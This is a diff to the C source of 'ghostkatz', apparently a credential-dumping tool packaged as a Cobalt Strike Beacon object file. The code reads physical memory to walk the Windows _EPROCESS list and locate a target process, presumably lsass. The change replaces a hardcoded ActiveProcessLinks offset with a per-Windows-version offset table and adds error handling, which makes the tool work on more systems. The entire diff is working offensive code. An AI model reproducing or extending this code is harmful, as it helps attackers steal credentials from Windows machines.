@@ -1,9 +1,11 @@
+#pragma once
 #include <windows.h>
 #include <wchar.h>
 
 #include "ghostkatz.h"
 #include "superfetch.h"
 #include "defs.h"
+#include "lsass_offsets.h"
 
 
 static PVOID lpImageBase[2048]; // Move lpImageBase off the stack to avoid '___chkstk_ms' error
@@ -66,18 +68,39 @@ DWORD64 GetNtEprocessAddress(HANDLE hFile)
     return NtEprocessVirtualAddress;
 }
 
-DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocessVA)
+DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocessVA, char* pvWindowsVersion)
 {
-    int offsetActiveProcessLinks = 0x448;
+    int ActiveProcessLinksOffset = 0;
+
+    // Search for the string and get the corresponding hex value
+    int i = 0;
+    for (i = 0; i < 5; i++)
+    {
+        if (strcmp(LsassKeyOffsetsArray[i].WindowsVersion, pvWindowsVersion) == 0)
+        {
+            ActiveProcessLinksOffset = LsassKeyOffsetsArray[i].ActiveProcessLinksOffset;
+
+            break;
+        }
+    }
+
+    if (ActiveProcessLinksOffset == 0)
+    {
+        BeaconFormatPrintf(&outputbuffer, "Failed to get correct offsets for the Windows version!\n");
+        return 0;
+    }
 
     // Starting from _EPROCESS address, traverse the ActiveProcessLinks member to get the _EPROCESS for other processes
     DWORD64 TargetPhysicalAddress = 0;
-    TranslateV2P(NtEprocessVA,  &TargetPhysicalAddress);
+    if (!TranslateV2P(NtEprocessVA,  &TargetPhysicalAddress))
+    {
+        return 0; // invalid address
+    }
     DWORD64 NtEProcessPA = TargetPhysicalAddress;
 
 
     // Get the Flink for Nt's ActiveProcessLinks member and start from there
-    DWORD64 InitialActiveProcessLinksFlink = NtEProcessPA + offsetActiveProcessLinks;
+    DWORD64 InitialActiveProcessLinksFlink = NtEProcessPA + ActiveProcessLinksOffset;
     DWORD64 ActiveProcessLinksFlink = ReadAddressAtPhysicalAddressLocation(hFile, InitialActiveProcessLinksFlink);   
 
     int FlinkPID = 0;
@@ -85,7 +108,10 @@ DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocess
 
     while (FlinkPID != TargetPID)
     {
-        TranslateV2P(ActiveProcessLinksFlink, &TargetPhysicalAddress); // Returned PA will be the ActiveProcessLinks member
+        if (!TranslateV2P(ActiveProcessLinksFlink, &TargetPhysicalAddress)) // Returned PA will be the ActiveProcessLinks member
+        {
+            break; // invalid address
+        }
         for (DWORD64 i = TargetPhysicalAddress - 1; i >= TargetPhysicalAddress - 8; i--) // Check the PID member
         {
             BYTE ReadValue = 0;
@@ -107,14 +133,12 @@ DWORD64 GetTargetEProcessAddress(HANDLE hFile, int TargetPID, DWORD64 NtEprocess
         else
         {
             
-            TargetProcessEProcessBase = TargetPhysicalAddress - offsetActiveProcessLinks;
-            //DEBUG_PRINT("Found Target Process PID: %d\n", FlinkPID);
+            TargetProcessEProcessBase = TargetPhysicalAddress - ActiveProcessLinksOffset;
 
             // Target _EPROCESS address is represented as a PA. I want to translate to VA and then return that value
             DWORD64 TargetEprocessVirtualAddress = 0;
             if (TranslateP2V(TargetProcessEProcessBase, &TargetEprocessVirtualAddress))
             {
-                //DEBUG_PRINT("Target _EPROCESS Virtual Address: 0x%llx\n", TargetEprocessVirtualAddress);
                 return TargetEprocessVirtualAddress;
             }
             else
